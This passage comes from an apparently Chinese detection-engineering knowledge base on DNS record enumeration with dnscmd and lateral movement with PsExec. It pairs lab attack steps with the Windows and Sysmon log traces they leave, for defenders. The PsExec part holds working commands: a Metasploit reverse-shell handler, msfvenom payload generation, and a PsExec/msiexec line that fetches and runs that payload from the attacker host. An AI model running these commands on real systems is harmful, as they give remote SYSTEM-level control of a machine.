<p>\u9ed8\u8ba4\u5b89\u88c5\u7684\u7cfb\u7edf\uff1a</p> <ul> <li>Windows Server 2003</li> <li>Windows Server 2008</li> <li>Windows Server 2003 R2</li> <li>Windows Server 2008 R2</li> <li>Windows Server 2012</li> <li>Windows Server 2003 with SP1</li> <li>\u2026</li> </ul> <p>\u53c2\u8003\u8d44\u6599\uff1a</p> <p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc772069(v=ws.11)</p> <p>Win7\u7cfb\u7edf\u5728\u4f7f\u7528\u65f6\u9700\u8981\u5b89\u88c5Remote Server Administration Tools (RSAT)</p> <p>\u53c2\u8003\u5730\u5740\uff1a</p> <p>https://support.microsoft.com/en-us/help/2693643/remote-server-administration-tools-rsat-for-windows-operating-systems</p> <p>RSAT\u4e0b\u8f7d\u5730\u5740\uff1a</p> <p>https://www.microsoft.com/en-us/download/details.aspx?id=7887</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>Windows\u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_4","title":"\u5e38\u7528\u547d\u4ee4","text":"<p>\u672a\u80fd\u5b9e\u73b0\u4e09\u597d\u5b66\u751f\u5927\u4f6c\u8bf4\u7684\u6548\u679c\uff0c\u540c\u6837\u6211\u7684Windows server 2008R2\u5e76\u4e0d\u652f\u6301dnscmd\u8fd9\u4e2a\u547d\u4ee4\u3002\u5f88\u65e0\u5948\u3002\u5728Windows server 2016\u4e2d\u5e76\u6ca1\u6709\".\"\uff0c\u503c\u5f97\u6ce8\u610f\u3002</p> <pre><code>C:\\Users\\12306br0&gt;dnscmd ./ZoneInfo 361a.com\n\u6307\u5b9a\u4e86\u672a\u77e5\u7684\u547d\u4ee4\u201c361a.com\u201d -- \u952e\u5165 DnsCmd -?\u3002\n\n\n\u5728\u5c06\u6765\u7684 Windows \u7248\u672c\u4e2d\uff0cMicrosoft \u53ef\u80fd\u4f1a\u5220\u9664 dnscmd.exe\u3002\n\n\u5982\u679c\u4f60\u5f53\u524d\u4f7f\u7528 dnscmd.exe \u914d\u7f6e\u548c\u7ba1\u7406 DNS \u670d\u52a1\u5668\uff0c\nMicrosoft \u5efa\u8bae\u4f60\u8fc7\u6e21\u5230 Windows PowerShell\u3002\n\n\u82e5\u8981\u67e5\u770b DNS \u670d\u52a1\u5668\u7ba1\u7406\u547d\u4ee4\u5217\u8868\uff0c\u8bf7\u5728\nWindows PowerShell \u63d0\u793a\u7b26\u5904\u952e\u5165 \"Get-Command -Module DnsServer\"\u3002\n\u6709\u5173\u9002\u7528\u4e8e DNS \u7684 Windows PowerShell \u547d\u4ee4\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\nhttp://go.microsoft.com/fwlink/?LinkId=217627\u3002\n\n\u7528\u6cd5: DnsCmd &lt;ServerName&gt; &lt;Command&gt; [&lt;Command Parameters&gt;]\n\n&lt;ServerName&gt;:\n  IP \u5730\u5740\u6216\u4e3b\u673a\u540d    -- \u8fdc\u7a0b\u6216\u672c\u5730 DNS \u670d\u52a1\u5668\u3002\n  .                  -- \u672c\u5730\u8ba1\u7b97\u673a\u4e0a\u7684 DNS \u670d\u52a1\u5668\n&lt;Command&gt;:\n  /Info                      -- \u83b7\u53d6\u670d\u52a1\u5668\u4fe1\u606f\n  /Config                    -- \u91cd\u7f6e\u670d\u52a1\u5668\u6216\u533a\u57df\u914d\u7f6e\n  /EnumZones                 -- \u679a\u4e3e\u533a\u57df\n  /Statistics                -- \u67e5\u8be2/\u6e05\u9664\u670d\u52a1\u5668\u7edf\u8ba1\u4fe1\u606f\u6570\u636e\n  /ClearCache                -- \u6e05\u9664 DNS \u670d\u52a1\u5668\u7f13\u5b58\n  /WriteBackFiles            -- \u5199\u5165\u6240\u6709\u533a\u57df\u6216\u6839\u63d0\u793a\u6570\u636e\u6587\u4ef6\n  /StartScavenging           -- \u5f00\u59cb\u670d\u52a1\u5668\u6e05\u7406\n  /IpValidate                -- \u9a8c\u8bc1\u8fdc\u7a0b DNS \u670d\u52a1\u5668\n  /EnumKSPs                  -- \u679a\u4e3e\u53ef\u7528\u7684\u5bc6\u94a5\u5b58\u50a8\u63d0\u4f9b\u7a0b\u5e8f\n  /ResetListenAddresses      -- \u5c06\u670d\u52a1\u5668 IP \u5730\u5740\u8bbe\u7f6e\u4e3a\u670d\u52a1 DNS \u8bf7\u6c42\n  /ResetForwarders           -- \u5c06 DNS \u670d\u52a1\u5668\u8bbe\u7f6e\u4e3a\u8f6c\u53d1\u9012\u5f52\u67e5\u8be2\n  /ZoneInfo                  -- \u67e5\u770b\u533a\u57df\u4fe1\u606f\n  /ZoneAdd                   -- \u5728 DNS \u670d\u52a1\u5668\u4e0a\u521b\u5efa\u65b0\u533a\u57df\n  /ZoneDelete                -- \u4ece DNS \u670d\u52a1\u5668\u6216 DS \u5220\u9664\u533a\u57df\n  /ZonePause                 -- \u6682\u505c\u533a\u57df\n  /ZoneResume                -- \u6062\u590d\u533a\u57df\n  /ZoneReload                -- \u4ece\u5176\u6570\u636e\u5e93(\u6587\u4ef6\u6216 DS)\u91cd\u65b0\u52a0\u8f7d\u533a\u57df\n  /ZoneWriteBack             -- \u5c06\u533a\u57df\u5199\u56de\u5230\u6587\u4ef6\n  /ZoneRefresh               -- \u5f3a\u5236\u5237\u65b0\u4e3b\u673a\u7684\u8f85\u52a9\u533a\u57df\n  /ZoneUpdateFromDs          -- \u4f7f\u7528\u6765\u81ea DS \u7684\u6570\u636e\u66f4\u65b0 DS \u96c6\u6210\u533a\u57df\n  /ZonePrint                 -- \u663e\u793a\u533a\u57df\u4e2d\u7684\u6240\u6709\u8bb0\u5f55\n  /ZoneResetType             -- \u66f4\u6539\u533a\u57df\u7c7b\u578b\n  /ZoneResetSecondaries      -- \u91cd\u7f6e\u533a\u57df\u7684\u8f85\u52a9\\\u901a\u77e5\u4fe1\u606f\n  /ZoneResetScavengeServers  -- \u91cd\u7f6e\u533a\u57df\u7684\u6e05\u7406\u670d\u52a1\u5668\n  /ZoneResetMasters          -- \u91cd\u7f6e\u8f85\u52a9\u533a\u57df\u7684\u4e3b\u670d\u52a1\u5668\n  /ZoneExport                -- \u5c06\u533a\u57df\u5bfc\u51fa\u5230\u6587\u4ef6\n  /ZoneChangeDirectoryPartition -- \u5c06\u533a\u57df\u79fb\u52a8\u5230\u53e6\u4e00\u76ee\u5f55\u5206\u533a\n  /ZoneSeizeKeymasterRole    -- \u5360\u7528\u533a\u57df\u7684\u5bc6\u94a5\u4e3b\u673a\u89d2\u8272\n  /ZoneTransferKeymasterRole -- \u4f20\u9001\u533a\u57df\u7684\u5bc6\u94a5\u4e3b\u673a\u89d2\u8272\n  /ZoneEnumSKDs              -- \u679a\u4e3e\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\n  /ZoneAddSKD                -- \u4e3a\u533a\u57df\u521b\u5efa\u65b0\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\n  /ZoneDeleteSKD             -- \u5220\u9664\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\n  /ZoneModifySKD             -- \u4fee\u6539\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\n  /ZoneValidateSigningParameters -- \u9a8c\u8bc1\u533a\u57df\u7684 DNSSEC \u8054\u673a\u7b7e\u540d\u53c2\u6570\n  /ZoneSetSKDState           -- \u4e3a\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\u8bbe\u7f6e\u6d3b\u52a8\u548c/\u6216\u5f85\u673a\u5bc6\u94a5\n  /ZoneGetSKDState           -- \u68c0\u7d22\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\u7684\u52a8\u6001\u72b6\u6001\n  /ZonePerformKeyRollover    -- \u5728\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\u4e2d\u89e6\u53d1\u5bc6\u94a5\u6eda\u52a8\u66f4\u65b0\n  /ZonePokeKeyRollover       -- \u5728\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\u4e2d\u89e6\u53d1\u5bc6\u94a5\u6eda\u52a8\u66f4\u65b0\n  /ZoneSign                  -- \u4f7f\u7528 DNSSEC \u8054\u673a\u7b7e\u540d\u53c2\u6570\u4e3a\u533a\u57df\u7b7e\u540d\n  /ZoneUnsign                -- \u4ece\u5df2\u7b7e\u540d\u7684\u533a\u57df\u4e2d\u5220\u9664 DNSSEC \u7b7e\u540d\n  /ZoneResign                -- \u5728\u5df2\u7b7e\u540d\u7684\u533a\u57df\u4e2d\u91cd\u65b0\u751f\u6210 DNSSEC \u7b7e\u540d\n  /EnumRecords               -- \u679a\u4e3e\u540c\u4e00\u540d\u79f0\u7684\u8bb0\u5f55\n  /RecordAdd                 -- \u5728\u533a\u57df\u6216\u6839\u63d0\u793a\u4e2d\u521b\u5efa\u8bb0\u5f55\n  /RecordDelete              -- \u4ece\u533a\u57df\u3001\u6839\u63d0\u793a\u6216\u7f13\u5b58\u4e2d\u5220\u9664\u8bb0\u5f55\n  /NodeDelete                -- \u5220\u9664\u540c\u4e00\u540d\u79f0\u7684\u6240\u6709\u8bb0\u5f55\n  /AgeAllRecords             -- \u5bf9\u533a\u57df\u4e2d\u7684\u8282\u70b9\u8fdb\u884c\u5f3a\u5236\u8001\u5316\n  /TrustAnchorAdd            -- \u5728 DNS \u670d\u52a1\u5668\u4e0a\u521b\u5efa\u65b0\u7684\u4fe1\u4efb\u5bc6\u94a5\u533a\u57df\n  /TrustAnchorDelete         -- \u4ece DNS \u670d\u52a1\u5668\u6216 DS \u5220\u9664\u4fe1\u4efb\u5bc6\u94a5\u533a\u57df\n  /EnumTrustAnchors          -- \u663e\u793a\u4fe1\u4efb\u5b9a\u4f4d\u70b9\u7684\u72b6\u6001\u4fe1\u606f\n  /TrustAnchorsResetType     -- \u66f4\u6539\u4fe1\u4efb\u5bc6\u94a5\u533a\u57df\u7684\u533a\u57df\u7c7b\u578b\n  /EnumDirectoryPartitions   -- \u679a\u4e3e\u76ee\u5f55\u5206\u533a\n  /DirectoryPartitionInfo    -- \u83b7\u53d6\u6709\u5173\u76ee\u5f55\u5206\u533a\u7684\u4fe1\u606f\n  /CreateDirectoryPartition  -- \u521b\u5efa\u76ee\u5f55\u5206\u533a\n  /DeleteDirectoryPartition  -- \u5220\u9664\u76ee\u5f55\u5206\u533a\n  /EnlistDirectoryPartition  -- \u5c06 DNS \u670d\u52a1\u5668\u6dfb\u52a0\u5230\u5206\u533a\u590d\u5236\u4f5c\u7528\u57df\n  /UnenlistDirectoryPartition -- \u4ece\u590d\u5236\u4f5c\u7528\u57df\u4e2d\u5220\u9664 DNS \u670d\u52a1\u5668\n  /CreateBuiltinDirectoryPartitions -- \u521b\u5efa\u5185\u7f6e\u5206\u533a\n  /ExportSettings            -- \u5c06\u8bbe\u7f6e\u8f93\u51fa\u5230 DNS \u670d\u52a1\u5668\u6570\u636e\u5e93\u76ee\u5f55\u4e2d\u7684 DnsSettings.txt\n  /OfflineSign               -- \u8131\u673a\u7b7e\u540d\u533a\u57df\u6587\u4ef6\uff0c\u5305\u62ec\u5bc6\u94a5\u751f\u6210/\u5220\u9664\n  /EnumTrustPoints           -- \u663e\u793a\u6240\u6709\u4fe1\u4efb\u70b9\u7684\u6709\u6548\u5237\u65b0\u4fe1\u606f\n  /ActiveRefreshAllTrustPoints -- \u7acb\u5373\u5bf9\u6240\u6709\u4fe1\u4efb\u70b9\u6267\u884c\u6709\u6548\u5237\u65b0\n  /RetrieveRootTrustAnchors  -- \u901a\u8fc7 HTTPS \u68c0\u7d22\u6839\u4fe1\u4efb\u5b9a\u4f4d\u70b9\n\n&lt;Command Parameters&gt;:\n  DnsCmd &lt;CommandName&gt; /? -- \u6709\u5173\u7279\u5b9a\u547d\u4ee4\u7684\u5e2e\u52a9\u4fe1\u606f\n\n\u5728\u5c06\u6765\u7684 Windows \u7248\u672c\u4e2d\uff0cMicrosoft \u53ef\u80fd\u4f1a\u5220\u9664 dnscmd.exe\u3002\n\n\u5982\u679c\u4f60\u5f53\u524d\u4f7f\u7528 dnscmd.exe \u914d\u7f6e\u548c\u7ba1\u7406 DNS \u670d\u52a1\u5668\uff0c\nMicrosoft \u5efa\u8bae\u4f60\u8fc7\u6e21\u5230 Windows PowerShell\u3002\n\n\u82e5\u8981\u67e5\u770b DNS \u670d\u52a1\u5668\u7ba1\u7406\u547d\u4ee4\u5217\u8868\uff0c\u8bf7\u5728\nWindows PowerShell \u63d0\u793a\u7b26\u5904\u952e\u5165 \"Get-Command -Module DnsServer\"\u3002\n\u6709\u5173\u9002\u7528\u4e8e DNS \u7684 Windows PowerShell \u547d\u4ee4\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\nhttp://go.microsoft.com/fwlink/?LinkId=217627\u3002\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_5","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\n\n\u521b\u5efa\u8005\u4e3b\u9898:\n \u5b89\u5168 ID:  361A\\12306br0\n \u5e10\u6237\u540d:  12306br0\n \u5e10\u6237\u57df:  361A\n \u767b\u5f55 ID:  0x36D7FD\n\n\u76ee\u6807\u4e3b\u9898:\n \u5b89\u5168 ID:  NULL SID\n \u5e10\u6237\u540d:  -\n \u5e10\u6237\u57df:  -\n \u767b\u5f55 ID:  0x0\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u65b0\u8fdb\u7a0b ID:  0x111c\n \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\dnscmd.exe\n \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938\n \u5f3a\u5236\u6027\u6807\u7b7e:  Mandatory Label\\Medium Mandatory Level\n \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0xb40\n \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe\n \u8fdb\u7a0b\u547d\u4ee4\u884c: dnscmd  /ZoneInfo 361a.com\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_6","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_7","title":"\u5efa\u8bae","text":"<p>\u6700\u7b80\u5355\u7684\u529e\u6cd5\u5c31\u662f\u68c0\u6d4b\u76f8\u5173\u547d\u4ee4\u884c\u53ca\u8fdb\u7a0b\uff0c\u4f46\u8fd9\u4f3c\u4e4e\u4e0d\u662f\u5f88\u9760\u8c31\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1590</p> <p>https://attack.mitre.org/techniques/T1590/</p> <p>\u57df\u6e17\u900f\u2014\u2014DNS\u8bb0\u5f55\u7684\u83b7\u53d6</p> <p>https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/","title":"T1021-002-win-\u57fa\u4e8e\u767d\u540d\u5355PsExec\u6267\u884cpayload","text":""},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u670d\u52a1\u5668\u5e10\u6237\u963b\u6b62\uff08SMB\uff09\u4f7f\u7528\u6709\u6548\u5e10\u6237\u4e0e\u8fdc\u7a0b\u7f51\u7edc\u5171\u4eab\u8fdb\u884c\u4ea4\u4e92\u3002\u7136\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4ee5\u767b\u5f55\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u64cd\u4f5c\u3002</p> <p>SMB\u662f\u540c\u4e00\u7f51\u7edc\u6216\u57df\u4e0aWindows\u8ba1\u7b97\u673a\u7684\u6587\u4ef6\uff0c\u6253\u5370\u673a\u548c\u4e32\u884c\u7aef\u53e3\u5171\u4eab\u534f\u8bae\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528SMB\u4e0e\u6587\u4ef6\u5171\u4eab\u8fdb\u884c\u4ea4\u4e92\uff0c\u4ece\u800c\u5141\u8bb8\u4ed6\u4eec\u5728\u6574\u4e2a\u7f51\u7edc\u4e2d\u6a2a\u5411\u79fb\u52a8\u3002SMB\u7684Linux\u548cmacOS\u5b9e\u73b0\u901a\u5e38\u4f7f\u7528Samba\u3002</p> <p>Windows\u7cfb\u7edf\u5177\u6709\u9690\u85cf\u7684\u7f51\u7edc\u5171\u4eab\uff0c\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u8bbf\u95ee\u5b83\u4eec\uff0c\u5e76\u63d0\u4f9b\u4e86\u8fdc\u7a0b\u6587\u4ef6\u590d\u5236\u548c\u5176\u4ed6\u7ba1\u7406\u529f\u80fd\u3002\u4f8b\u5982\u7f51\u7edc\u5171\u4eab\u5305\u62ecC$\uff0cADMIN$\uff0c\u548cIPC$\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u6b64\u6280\u672f\u4e0e\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u6709\u6548\u5e10\u6237\u7ed3\u5408\u4f7f\u7528\uff0c\u4ee5\u901a\u8fc7SMB\u8fdc\u7a0b\u8bbf\u95ee\u7f51\u7edc\u7cfb\u7edf\uff1b\u4f7f\u7528\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff08RPC\uff09\u4e0e\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\uff1b\u4f20\u8f93\u6587\u4ef6\uff1b\u4ee5\u53ca\u901a\u8fc7\u8fdc\u7a0b\u6267\u884c\u6765\u8fd0\u884c\u4f20\u8f93\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u4f9d\u8d56\u4e8eSMB/RPC\u4e0a\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u4f1a\u8bdd\u7684\u793a\u4f8b\u6267\u884c\u6280\u672f\u4e3a\u8ba1\u5212\u4efb\u52a1/\u4f5c\u4e1a\uff0c\u670d\u52a1\u6267\u884c\u548cWindows\u7ba1\u7406\u89c4\u8303\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528NTLM\u54c8\u5e0c\u8bbf\u95ee\u5177\u6709\u6563\u5217\uff0c\u7279\u5b9a\u914d\u7f6e\u548c\u8865\u4e01\u7a0b\u5e8f\u7ea7\u522b\u7684\u7cfb\u7edf\u4e0a\u7684\u7ba1\u7406\u5458\u5171\u4eab\u3002</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5fae\u8f6f\u4e8e2006\u5e747\u6708\u6536\u8d2dsysinternals\u516c\u53f8\uff0cPsExec\u662fSysinternalsSuite\u7684\u5c0f\u5de5\u5177\u4e4b\u4e00\uff0c\u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u7684telnet\u66ff\u4ee3\u54c1\uff0c\u5141\u8bb8\u5728\u5176\u4ed6\u7cfb\u7edf\u4e0a\u6267\u884c\u8fdb\u7a0b\uff0c\u5b8c\u6210\u63a7\u5236\u53f0\u5e94\u7528\u7a0b\u5e8f\u7684\u5b8c\u5168\u4ea4\u4e92\uff0c\u800c\u65e0\u9700\u624b\u52a8\u5b89\u88c5\u5ba2\u6237\u7aef\u8f6f\u4ef6\uff0c\u5e76\u4e14\u53ef\u4ee5\u83b7\u5f97\u4e0e\u63a7\u5236\u53f0\u5e94\u7528\u7a0b\u5e8f\u76f8\u5f53\u7684\u5b8c\u5168\u4ea4\u4e92\u6027\u3002</p> <p>\u5fae\u8f6f\u5b98\u65b9\u6587\u6863\uff1a</p> <p>https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</p> <p>\u8bf4\u660e\uff1aPsExec.exe\u6ca1\u6709\u9ed8\u8ba4\u5b89\u88c5\u5728windows\u7cfb\u7edf\u3002</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awin7\uff08sysmon\u65e5\u5fd7\uff09</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#msf","title":"\u914d\u7f6eMSF","text":"<pre><code>msf5 &gt; use exploit/multi/handler\nmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set lhost 192.168.126.146\nlhost =&gt; 192.168.126.146\nmsf5 exploit(multi/handler) &gt; set lport 4444\nlport =&gt; 4444\nmsf5 exploit(multi/handler) &gt; exploit\n</code></pre>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#payload","title":"\u751f\u6210payload","text":"<pre><code>msfvenom -a  x86 --platform windows -p  windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f msi &gt; shellcode.msi\n</code></pre>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_6","title":"\u9776\u673a\u6267\u884c","text":"<p>\u6ce8\u610f\uff1a\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650</p> <pre><code>PsExec.exe -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi\n</code></pre>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#shell","title":"\u53cd\u5f39shell","text":"<pre><code>msf5 exploit(multi/handler) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.126.146:4444\n[*] Sending stage (180291 bytes) to 192.168.126.149\n[*] Meterpreter session 1 opened (192.168.126.146:4444 -&gt; 192.168.126.149:49371) at 2020-04-18 23:09:44 +0800\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; getpid\nCurrent pid: 2352\n</code></pre>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_7","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>windows \u5b89\u5168\u65e5\u5fd7\nEventID\uff1a 4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0xe84\n\u65b0\u8fdb\u7a0b\u540d: C:\\Users\\12306Br0\\Desktop\\PSTools\\PsExec.exe\n\nEventID\uff1a 4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0xfcc\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\PSEXESVC.exe\n\nEVentID\uff1a5140\n\u7f51\u7edc\u4fe1\u606f:\n\u5bf9\u8c61\u7c7b\u578b: File\n\u6e90\u5730\u5740: fe80::719e:d312:648f:4884\n\u6e90\u7aef\u53e3: 49369\n\u5171\u4eab\u4fe1\u606f:\n\u5171\u4eab\u540d: \\\\*\\IPC$\n\nEventID\uff1a5145\n\u7f51\u7edc\u4fe1\u606f:\n\u5bf9\u8c61\u7c7b\u578b: File\n\u6e90\u5730\u5740: fe80::719e:d312:648f:4884\n\u6e90\u7aef\u53e3: 49369\n\n\u5171\u4eab\u4fe1\u606f:\n\u5171\u4eab\u540d\u79f0: \\\\*\\IPC$\n\u5171\u4eab\u8def\u5f84:\n\u76f8\u5bf9\u76ee\u6807\u540d\u79f0: PSEXESVC\n\nSYSMON\u65e5\u5fd7\nEventID\uff1a1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 15:09:29.237\nProcessGuid: {bb1f7c32-1829-5e9b-0000-00107a844001}\nProcessId: 3716\nImage: C:\\Users\\12306Br0\\Desktop\\PSTools\\PsExec.exe\nFileVersion: 2.2\nDescription: Execute processes remotely\nProduct: Sysinternals PsExec\nCompany: Sysinternals - www.sysinternals.com\nOriginalFileName: psexec.c\nCommandLine: PsExec.exe  -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi\nCurrentDirectory: C:\\Users\\12306Br0\\Desktop\\PSTools\\\nUser: 12306Br0-PC\\12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}\nLogonId: 0x6e1ea\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=E50D9E3BD91908E13A26B3E23EDEAF577FB3A095\nParentProcessGuid: {bb1f7c32-1806-5e9b-0000-001070474001}\nParentProcessId: 3492\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: 